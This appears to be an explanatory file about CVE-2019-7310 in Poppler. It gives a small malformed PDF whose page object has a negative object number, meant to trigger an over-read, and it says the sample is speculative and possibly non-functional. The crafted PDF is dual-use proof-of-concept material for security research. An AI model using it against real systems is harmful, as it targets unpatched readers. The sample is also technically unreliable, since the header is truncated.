@@ -1,0 +1,19 @@
+Given the emphasis on the object number of a stream object as the relevant field for CVE-2019-7310 and aiming to demonstrate a hypothetical exploit for educational and security research purposes only, a crafted PDF document would include a negative object number to exploit the integer signedness error in Poppler prior to the patch. This malformed PDF would be attempting to trigger an over-read by referencing a negative object number, exploiting the oversight in Poppler's handling of such numbers. 
+
+Here's how the provided minimal PDF content might be modified to illustrate this concept:
+
+```
+%PDF-1.
+1 0 obj<</Pages 2 0 R>>endobj
+2 0 obj<</Kids[-3 0 R]/Count 1>>endobj
+-3 0 obj<</Parent 2 0 R/Type/Page/Contents 4 0 R>>endobj
+4 0 obj<</Length 45>>stream
+BT /F1 24 Tf 100 700 Td (Crafted Exploit) Tj ET
+endstream
+endobj
+trailer<</Size 5 /Root 1 0 R>>
+```
+
+**Please Note**: The above example is intentionally crafted to demonstrate how the CVE might be triggered and is purely speculative for illustrative purposes. The negative object number (-3 0 R) is inserted to show how an inappropriate value, potentially leveraging the vulnerability, could be used in an exploit. However, this particular crafted example does not represent a directly usable or functional exploit and may not conform to all PDF standards given the simplicity and speculative nature of the modification. The aim is to conceptualize the misuse of negative object numbers that led to the vulnerability in question. 
+
+**Disclaimer**: This example is for educational and security research purposes only. Creating or distributing malicious PDF files or attempting to exploit vulnerabilities in software without authorization is illegal and unethical.
